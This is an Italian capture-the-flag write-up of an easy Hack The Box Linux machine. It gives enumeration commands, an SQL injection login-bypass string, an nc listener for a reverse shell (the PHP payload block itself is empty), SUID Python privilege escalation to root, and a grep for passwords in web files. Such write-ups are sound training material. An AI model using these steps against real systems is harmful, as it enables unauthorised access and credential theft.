
# Easy Machine Writeup - HTB

![Easy Machine Logo](https://cdn.pixabay.com/photo/2018/08/04/11/30/draw-3583548_1280.png)

*Autore: hackerman*
*Data: 15 Ottobre 2023*
*Difficoltà: Facile*
*OS: Linux*

## Enumeration

### Scansione iniziale

Eseguita scansione iniziale con nmap:

```bash
nmap -sV -sC -oA scansioni/nmap_initial 10.10.10.10
```

**Risultati:**
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp  open  http     Apache httpd 2.4.29
443/tcp open  ssl/http Apache httpd 2.4.29
```

### Web Enumeration

Directory interessanti trovate con gobuster:

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

| Path           | Status Code |
|----------------|-------------|
| /admin         | 403         |
| /backup        | 301         |
| /index.html    | 200         |
| /robots.txt    | 200         |

Contenuto di robots.txt:
```
User-agent: *
Disallow: /secret_admin
```

## Exploitation

### Vulnerabilità trovata

La pagina `/secret_admin` contiene un form di login vulnerabile a SQL injection:

```sql
admin' OR '1'='1'-- -
```

### Reverse Shell

Dopo l'accesso, trovata possibilità di upload file. Creato payload malicious.php:

```php

```

Ottenuta reverse shell con:

```bash
nc -lvnp 4444
# poi nel browser

```

## Privilege Escalation

### Enumeration interna

Trovato file interessante con permessi SUID:

```bash
find / -perm -4000 2>/dev/null
/usr/bin/python3.6
```

### Abuso di Python SUID

Sfruttato per ottenere root:

```python
import os
os.system('/bin/bash -p')
```

**Proof.txt:**
```
7294b59a3a18a3e0e3e9a6f8b4c2d1e
```

## Conclusioni

### Lezioni imparate

1. **Non fidarsi dei percorsi "nascosti"**:
   > "Security through obscurity is not security at all" - Vecchio proverbio hacker

2. **Aggiornare sempre i servizi**:
   - Apache 2.4.29 aveva vulnerabilità note
   - OpenSSH 7.6p1 era outdated

### Comandi utili usati

```bash
# Trovare file modificati di recente
find / -type f -mtime -1 2>/dev/null

# Cercare credenziali
grep -r "password" /var/www 2>/dev/null
```
